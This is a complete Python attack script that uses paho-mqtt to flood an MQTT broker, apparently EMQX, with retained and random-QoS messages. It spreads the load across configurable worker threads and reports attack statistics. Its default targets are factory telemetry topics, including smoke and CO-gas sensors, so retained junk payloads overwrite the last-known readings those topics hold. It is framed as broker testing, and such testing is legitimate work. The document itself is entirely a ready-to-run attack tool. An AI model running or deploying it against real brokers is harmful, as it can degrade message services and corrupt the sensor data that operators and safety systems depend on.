#!/usr/bin/env python3
"""
MQTT Retain/QoS Abuse Attack Script (Windows Compatible)
=======================================================
Simulates retain flag and QoS abuse to test EMQX message handling and storage.
"""

import paho.mqtt.client as mqtt
import json
import time
import threading
import random
import argparse
import sys
import os
from datetime import datetime, timezone

class RetainQoSAbuseAttack:
    def __init__(self, broker_host="localhost", broker_port=1883, 
                 username=None, password=None, use_tls=False):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.username = username
        self.password = password
        self.use_tls = use_tls
        self.attack_stats = {
            "retain_messages_sent": 0,
            "qos_messages_sent": 0,
            "messages_accepted": 0,
            "messages_rejected": 0,
            "connections_failed": 0,
            "start_time": None,
            "end_time": None
        }
        
    def create_client(self, client_id):
        """Create MQTT client with security settings"""
        try:
            client = mqtt.Client(client_id=client_id, callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
            
            if self.username and self.password:
                client.username_pw_set(self.username, self.password)
            
            if self.use_tls:
                client.tls_set()
            
            return client
        except Exception as e:
            print(f" Error creating client {client_id}: {e}")
            return None
    
    def retain_abuse_worker(self, worker_id, topics, num_messages=100, delay_ms=100):
        """Worker thread for retain flag abuse"""
        client_id = f"retain_abuser_{worker_id}"
        client = self.create_client(client_id)
        
        if not client:
            self.attack_stats["connections_failed"] += 1
            return
        
        try:
            # Connect to broker
            client.connect(self.broker_host, self.broker_port, 60)
            client.loop_start()
            
            print(f" Worker {worker_id}: Connected, starting retain abuse...")
            
            # Send retain messages
            for i in range(num_messages):
                try:
                    topic = random.choice(topics)
                    
                    # Generate payload
                    payload = {
                        "attack_type": "retain_abuse",
                        "worker_id": worker_id,
                        "message_id": i,
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "retain_data": "R" * random.randint(100, 1000)
                    }
                    
                    # Publish with retain flag
                    result = client.publish(topic, json.dumps(payload), qos=0, retain=True)
                    
                    self.attack_stats["retain_messages_sent"] += 1
                    
                    if result.rc == 0:
                        self.attack_stats["messages_accepted"] += 1
                        if i % 20 == 0:  # Don't spam
                            print(f" Worker {worker_id}: Retain message {i} accepted")
                    else:
                        self.attack_stats["messages_rejected"] += 1
                        print(f" Worker {worker_id}: Retain message {i} rejected")
                    
                    # Delay between messages
                    if delay_ms > 0:
                        time.sleep(delay_ms / 1000.0)
                        
                except Exception as e:
                    self.attack_stats["messages_rejected"] += 1
                    if i % 20 == 0:  # Don't spam errors
                        print(f" Worker {worker_id}: Error sending retain message {i}: {e}")
            
            print(f" Worker {worker_id}: Completed retain abuse attack")
            
        except Exception as e:
            print(f" Worker {worker_id}: Connection failed: {e}")
            self.attack_stats["connections_failed"] += 1
        finally:
            try:
                client.loop_stop()
                client.disconnect()
            except:
                pass
    
    def qos_abuse_worker(self, worker_id, topics, num_messages=100, delay_ms=100):
        """Worker thread for QoS abuse"""
        client_id = f"qos_abuser_{worker_id}"
        client = self.create_client(client_id)
        
        if not client:
            self.attack_stats["connections_failed"] += 1
            return
        
        try:
            # Connect to broker
            client.connect(self.broker_host, self.broker_port, 60)
            client.loop_start()
            
            print(f" Worker {worker_id}: Connected, starting QoS abuse...")
            
            # Send QoS messages
            for i in range(num_messages):
                try:
                    topic = random.choice(topics)
                    
                    # Generate payload
                    payload = {
                        "attack_type": "qos_abuse",
                        "worker_id": worker_id,
                        "message_id": i,
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "qos_level": random.choice([0, 1, 2]),
                        "qos_data": "Q" * random.randint(100, 1000)
                    }
                    
                    # Random QoS level
                    qos_level = random.choice([0, 1, 2])
                    
                    # Publish with QoS
                    result = client.publish(topic, json.dumps(payload), qos=qos_level)
                    
                    self.attack_stats["qos_messages_sent"] += 1
                    
                    if result.rc == 0:
                        self.attack_stats["messages_accepted"] += 1
                        if i % 20 == 0:  # Don't spam
                            print(f" Worker {worker_id}: QoS {qos_level} message {i} accepted")
                    else:
                        self.attack_stats["messages_rejected"] += 1
                        print(f" Worker {worker_id}: QoS {qos_level} message {i} rejected")
                    
                    # Delay between messages
                    if delay_ms > 0:
                        time.sleep(delay_ms / 1000.0)
                        
                except Exception as e:
                    self.attack_stats["messages_rejected"] += 1
                    if i % 20 == 0:  # Don't spam errors
                        print(f" Worker {worker_id}: Error sending QoS message {i}: {e}")
            
            print(f" Worker {worker_id}: Completed QoS abuse attack")
            
        except Exception as e:
            print(f" Worker {worker_id}: Connection failed: {e}")
            self.attack_stats["connections_failed"] += 1
        finally:
            try:
                client.loop_stop()
                client.disconnect()
            except:
                pass
    
    def mixed_abuse_worker(self, worker_id, topics, num_messages=100, delay_ms=100):
        """Worker thread for mixed retain/QoS abuse"""
        client_id = f"mixed_abuser_{worker_id}"
        client = self.create_client(client_id)
        
        if not client:
            self.attack_stats["connections_failed"] += 1
            return
        
        try:
            # Connect to broker
            client.connect(self.broker_host, self.broker_port, 60)
            client.loop_start()
            
            print(f" Worker {worker_id}: Connected, starting mixed abuse...")
            
            # Send mixed messages
            for i in range(num_messages):
                try:
                    topic = random.choice(topics)
                    
                    # Generate payload
                    payload = {
                        "attack_type": "mixed_abuse",
                        "worker_id": worker_id,
                        "message_id": i,
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "mixed_data": "M" * random.randint(100, 1000)
                    }
                    
                    # Random QoS and retain combination
                    qos_level = random.choice([0, 1, 2])
                    retain_flag = random.choice([True, False])
                    
                    # Publish with mixed settings
                    result = client.publish(topic, json.dumps(payload), qos=qos_level, retain=retain_flag)
                    
                    if retain_flag:
                        self.attack_stats["retain_messages_sent"] += 1
                    else:
                        self.attack_stats["qos_messages_sent"] += 1
                    
                    if result.rc == 0:
                        self.attack_stats["messages_accepted"] += 1
                        if i % 20 == 0:  # Don't spam
                            print(f" Worker {worker_id}: Mixed message {i} (QoS:{qos_level}, Retain:{retain_flag}) accepted")
                    else:
                        self.attack_stats["messages_rejected"] += 1
                        print(f" Worker {worker_id}: Mixed message {i} rejected")
                    
                    # Delay between messages
                    if delay_ms > 0:
                        time.sleep(delay_ms / 1000.0)
                        
                except Exception as e:
                    self.attack_stats["messages_rejected"] += 1
                    if i % 20 == 0:  # Don't spam errors
                        print(f" Worker {worker_id}: Error sending mixed message {i}: {e}")
            
            print(f" Worker {worker_id}: Completed mixed abuse attack")
            
        except Exception as e:
            print(f" Worker {worker_id}: Connection failed: {e}")
            self.attack_stats["connections_failed"] += 1
        finally:
            try:
                client.loop_stop()
                client.disconnect()
            except:
                pass
    
    def launch_attack(self, attack_type="mixed", num_workers=2, messages_per_worker=100, 
                     delay_ms=100, topics=None):
        """Launch retain/QoS abuse attack"""
        if topics is None:
            topics = [
                "factory/tenantA/Temperature/telemetry",
                "factory/tenantA/Humidity/telemetry",
                "factory/tenantA/Motion/telemetry",
                "factory/tenantA/CO-Gas/telemetry",
                "factory/tenantA/Smoke/telemetry",
                "system/test/retain",
                "security/test/qos"
            ]
        
        print(f" Starting Retain/QoS Abuse Attack")
        print(f"   Attack type: {attack_type}")
        print(f"   Workers: {num_workers}")
        print(f"   Messages per worker: {messages_per_worker}")
        print(f"   Delay: {delay_ms}ms")
        print(f"   Topics: {len(topics)}")
        print("=" * 60)
        
        self.attack_stats["start_time"] = time.time()
        
        # Create worker threads based on attack type
        threads = []
        
        if attack_type == "retain":
            for i in range(num_workers):
                thread = threading.Thread(
                    target=self.retain_abuse_worker,
                    args=(i, topics, messages_per_worker, delay_ms)
                )
                threads.append(thread)
        elif attack_type == "qos":
            for i in range(num_workers):
                thread = threading.Thread(
                    target=self.qos_abuse_worker,
                    args=(i, topics, messages_per_worker, delay_ms)
                )
                threads.append(thread)
        else:  # mixed
            for i in range(num_workers):
                thread = threading.Thread(
                    target=self.mixed_abuse_worker,
                    args=(i, topics, messages_per_worker, delay_ms)
                )
                threads.append(thread)
        
        # Start all workers
        for thread in threads:
            thread.start()
        
        # Monitor attack
        try:
            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            print("\n  Attack stopped by user")
        
        self.attack_stats["end_time"] = time.time()
        self.print_attack_stats()
    
    def print_attack_stats(self):
        """Print attack statistics"""
        duration = self.attack_stats["end_time"] - self.attack_stats["start_time"]
        total_messages = self.attack_stats["retain_messages_sent"] + self.attack_stats["qos_messages_sent"]
        
        print("\n Attack Statistics:")
        print("=" * 40)
        print(f"Duration: {duration:.2f} seconds")
        print(f"Retain messages sent: {self.attack_stats['retain_messages_sent']}")
        print(f"QoS messages sent: {self.attack_stats['qos_messages_sent']}")
        print(f"Total messages: {total_messages}")
        print(f"Messages accepted: {self.attack_stats['messages_accepted']}")
        print(f"Messages rejected: {self.attack_stats['messages_rejected']}")
        print(f"Connections failed: {self.attack_stats['connections_failed']}")
        
        if total_messages > 0:
            success_rate = (self.attack_stats['messages_accepted'] / total_messages * 100)
            print(f"Success rate: {success_rate:.1f}%")
        
        if duration > 0:
            print(f"Messages per second: {total_messages/duration:.1f}")

def main():
    parser = argparse.ArgumentParser(description="MQTT Retain/QoS Abuse Attack")
    parser.add_argument("--broker", default="localhost", help="MQTT broker host")
    parser.add_argument("--port", type=int, default=1883, help="MQTT broker port")
    parser.add_argument("--username", help="MQTT username")
    parser.add_argument("--password", help="MQTT password")
    parser.add_argument("--tls", action="store_true", help="Use TLS connection")
    parser.add_argument("--type", choices=["retain", "qos", "mixed"], default="mixed", 
                       help="Attack type: retain, qos, or mixed")
    parser.add_argument("--workers", type=int, default=2, help="Number of worker threads")
    parser.add_argument("--messages", type=int, default=100, help="Messages per worker")
    parser.add_argument("--delay", type=int, default=100, help="Delay between messages (ms)")
    parser.add_argument("--topics", nargs="+", help="Custom target topics")
    
    args = parser.parse_args()
    
    # Create attack instance
    attack = RetainQoSAbuseAttack(
        broker_host=args.broker,
        broker_port=args.port,
        username=args.username,
        password=args.password,
        use_tls=args.tls
    )
    
    # Launch attack
    attack.launch_attack(
        attack_type=args.type,
        num_workers=args.workers,
        messages_per_worker=args.messages,
        delay_ms=args.delay,
        topics=args.topics
    )

if __name__ == "__main__":
    main()
